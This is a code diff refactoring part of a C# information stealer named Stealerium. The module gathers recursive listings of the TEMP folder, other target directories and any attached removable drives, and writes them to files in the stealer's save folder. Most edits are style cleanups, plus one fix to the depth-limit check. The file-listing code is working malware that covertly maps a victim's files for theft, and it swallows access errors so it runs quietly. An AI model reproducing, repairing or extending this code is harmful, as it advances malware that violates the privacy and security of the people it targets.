@@ -22,36 +22,47 @@ namespace Stealerium.Target.System
             Environment.GetEnvironmentVariable("TEMP")
         };
 
-        // Get directories tree
-        private static string GetDirectoryTree(string path, string indentation = "\t", int maxLevel = -1, int deep = 0)
+        // Get directory tree
+        private static string GetDirectoryTree(string path, string indentation = "\t", int maxLevel = -1, int depth = 0)
         {
             if (!Directory.Exists(path)) return "Directory not exists";
+
             var directory = new DirectoryInfo(path);
             var builder = new StringBuilder();
-            builder.AppendLine(string.Concat(Enumerable.Repeat(indentation, deep)) + directory.Name + "\\");
-            if (maxLevel == -1 || maxLevel < deep)
+            builder.AppendLine($"{string.Concat(Enumerable.Repeat(indentation, depth))}{directory.Name}\\");
+
+            if (maxLevel == -1 || maxLevel > depth)
+            {
                 try
                 {
                     foreach (var subdirectory in directory.GetDirectories())
+                    {
                         try
                         {
-                            builder.Append(GetDirectoryTree(subdirectory.FullName, indentation, maxLevel, deep + 1));
+                            builder.Append(GetDirectoryTree(subdirectory.FullName, indentation, maxLevel, depth + 1));
                         }
                         catch (UnauthorizedAccessException)
                         {
+                            // ignored
                         }
+                    }
                 }
                 catch (UnauthorizedAccessException)
                 {
+                    // ignored
                 }
+            }
 
             try
             {
                 foreach (var file in directory.GetFiles())
-                    builder.AppendLine(string.Concat(Enumerable.Repeat(indentation, deep + 1)) + file.Name);
+                {
+                    builder.AppendLine($"{string.Concat(Enumerable.Repeat(indentation, depth + 1))}{file.Name}");
+                }
             }
             catch (UnauthorizedAccessException)
             {
+                // ignored
             }
 
             return builder.ToString();
@@ -61,10 +72,7 @@ namespace Stealerium.Target.System
         private static string GetDirectoryName(string path)
         {
             var name = new DirectoryInfo(path).Name;
-            if (name.Length == 3)
-                return "DRIVE-" + name.Replace(":\\", "");
-
-            return name;
+            return name.Length == 3 ? $"DRIVE-{name.Replace(":\\", "")}" : name;
         }
 
         // Save directories tree
@@ -72,21 +80,30 @@ namespace Stealerium.Target.System
         {
             // Add USB, CD drives to directory structure
             foreach (var drive in DriveInfo.GetDrives())
+            {
                 if (drive.DriveType == DriveType.Removable && drive.IsReady)
+                {
                     TargetDirs.Add(drive.RootDirectory.FullName);
-            // Create tasks
+                }
+            }
+
+            // Create tasks for each path
             foreach (var path in TargetDirs)
+            {
                 try
                 {
                     var results = GetDirectoryTree(path);
                     var dirname = GetDirectoryName(path);
                     if (!results.Contains("Directory not exists"))
-                        File.WriteAllText(Path.Combine(sSavePath, dirname + ".txt"), results);
+                    {
+                        File.WriteAllText(Path.Combine(sSavePath, $"{dirname}.txt"), results);
+                    }
                 }
                 catch
                 {
                     // ignored
                 }
+            }
         }
     }
 }
